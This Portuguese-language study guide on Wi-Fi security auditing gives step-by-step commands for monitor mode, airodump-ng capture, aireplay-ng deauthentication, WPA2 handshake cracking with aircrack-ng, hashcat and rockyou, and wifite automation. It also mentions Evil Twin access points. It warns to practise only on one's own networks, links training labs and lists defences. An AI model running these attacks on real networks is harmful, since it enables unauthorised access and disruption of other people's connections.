# 📶 Segurança Wireless

> Auditoria de redes Wi-Fi: WPA/WPA2, WPA3, Evil Twin, deauth.

---

## 📚 O que é Segurança Wireless?

**Segurança Wireless** envolve auditar e testar redes Wi-Fi para encontrar vulnerabilidades em protocolos como WPA2, WPA3 e WPS. Inclui captura de handshakes, ataques Evil Twin e bypass de proteções.

### Por que isso é importante?

- Redes Wi-Fi são o **ponto de entrada mais comum** em empresas
- WPA2 ainda é amplamente usado e possui **vulnerabilidades conhecidas**
- **Evil Twin** pode capturar credenciais de qualquer rede
- Auditorias wireless são exigidas em **compliance e pentests**

### Como funciona na prática?

```
Modo Monitor → Capturar tráfego → Identificar rede alvo → Capturar handshake
→ Forçar deauth → Quebrar senha com wordlist → Acesso à rede
```

### Ferramentas

| Ferramenta | O que faz |
|:---|:---|
| **aircrack-ng** | Captura e quebra de handshakes WPA2 |
| **kismet** | Detector IDS wireless |
| **wifite** | Automação de ataques wireless |
| **hostapd** | Criar Evil Twin / Rogue AP |

---

## 🛠️ Instalação

```bash
sudo apt install -y aircrack-ng kismet wifite
```

---

## 🚀 Passo a Passo

### Pré-requisito: placa em modo monitor
```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# Verificar:
iwconfig
```

### Passo 1: Descobrir redes (Kismet / airodump)
```bash
sudo apt install -y aircrack-ng kismet
sudo airodump-ng wlan0

# Filtrar por canal e BSSID:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0
```

### Passo 2: Capturar handshake WPA2
```bash
# Em outro terminal, forçar deauth (apenas em lab):
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0
# Aguardar "WPA handshake" no airodump

# Verificar:
aircrack-ng captura-01.cap
```

### Passo 3: Quebrar senha
```bash
# Wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap

# Com hashcat (mais rápido GPU):
hcxpcapngtool -o hash.hc22000 captura-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### Passo 4: Wifite (automático)
```bash
sudo apt install -y wifite
sudo wifite --kill
```

---

## Ferramentas

| Ferramenta | Uso |
|:---|:---|
| **aircrack-ng** | Captura e quebra WPA |
| **kismet** | Detector IDS wireless |
| **wifite** | Automação de ataques |
| **hostapd + dnsmasq** | Criar Evil Twin / Rogue AP |
| **reaver / bully** | WPS brute force (antigo) |

## Defesas (Blue)

- WPA3, PMF, desativar WPS, 802.1X (Enterprise)
- Detectar deauth com `kismet` + WIDS

---

## 🧪 Labs Práticos

### TryHackMe
- **[Wi-Fi Hacking](https://tryhackme.com/room/wifihacking101)** — Fundamentos de auditoria wireless
- **[WPA2 Cracking](https://tryhackme.com/room/aircrack-ng)** — Captura e quebra de handshake WPA2

### HackTheBox
- **[Wireless Challenges](https://app.hackthebox.com/challenges/wireless)** — Desafios de rede wireless

### Exercícios Locais
```bash
# Listar redes com airodump-ng
sudo airodump-ng wlan0mon

# Capturar handshake em rede de teste (AP próprio)
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w lab_capture wlan0mon

# Forçar deauth (apenas em AP próprio/lab)
sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# Quebrar com rockyou.txt
aircrack-ng -w /usr/share/wordlists/rockyou.txt lab_capture-01.cap

# Usar Wifite para automação
sudo wifite --kill --wpa --dict /usr/share/wordlists/rockyou.txt
```

### Desafio Integrado
1. Configure um AP com WPA2 (hostapd) como target
2. Capture handshake com airodump-ng + deauth
3. Quebre a senha com aircrack-ng
4. Documente tempo e método utilizado

### Resumo da ordem — Por que essa sequência?

Wireless segue: **preparar → capturar → quebrar → automatizar**.

```
PASSO 1: Preparar → Modo monitor
├── POR QUE: Precisa capturar tráfego que não é destinado ao seu device
├── O QUE FAZER: Habilitar modo monitor na placa Wi-Fi
├── COMANDO: sudo iw dev wlan0 set type monitor
├── QUANDO AVANÇAR: Quando `iwconfig` mostrar modo monitor
└── DICAS: Use placa compatível (Alfa AWUS036ACH)

        ↓

PASSO 2: Descobrir → Mapear redes
├── POR QUE: Precisa saber quais redes existem e seus detalhes
├── O QUE FAZER: airodump-ng ou Kismet
├── COMANDO: sudo airodump-ng wlan0
├── QUANDO AVANÇAR: Quando identificar rede alvo
└── DICAS: Anote BSSID, canal, nome da rede

        ↓

PASSO 3: Capturar → Obter handshake
├── POR QUE: Handshake é a chave para quebrar senha WPA2
├── O QUE FAZER: Capturar com airodump + deauth para forçar reconexão
├── COMANDO: sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w captura wlan0
├── QUANDO AVANÇAR: Quando aparecer "WPA handshake"
└── DICAS: Capture vários handshakes para garantir

        ↓

PASSO 4: Quebrar → Crack da senha
├── POR QUE: Handshake criptografado precisa ser decodificado
├── O QUE FAZER: aircrack-ng ou hashcat com wordlist
├── COMANDO: aircrack-ng -w rockyou.txt captura-01.cap
├── QUANDO AVANÇAR: Quando tiver senha
└── DICAS: Use GPU (hashcat) para velocidade

        ↓

PASSO 5: Automatizar → Wifite
├── POR QUE: Processo manual é lento, Wifite automatiza tudo
├── O QUE FAZER: Usar Wifite para captura automática
├── COMANDO: sudo wifite --kill
├── QUANDO PARAR: Quando tiver senhas capturadas
└── DICAS: Wifite faz tudo automaticamente (deauth + crack)
```

---

> **ATENÇÃO:** Pratique apenas em redes próprias ou em lab isolado. Sniffing em redes alheias é crime (Art. 154-A do Código Penal).

---

## Lab Prático

### Exercício 1: WPA2 Handshake Crack
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/aircrack-ng
- **O que vai praticar:** Captura e quebra de handshake WPA2
- **Tempo estimado:** 45 min

### Exercício 2: Evil Twin Attack
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/wifihacking101
- **O que vai praticar:** Criar rogue AP e capturar credenciais
- **Tempo estimado:** 60 min

### Dica de Estudo
> Use um AP próprio (hostapd) para praticar. Nunca ataque redes sem autorização escrita.

---
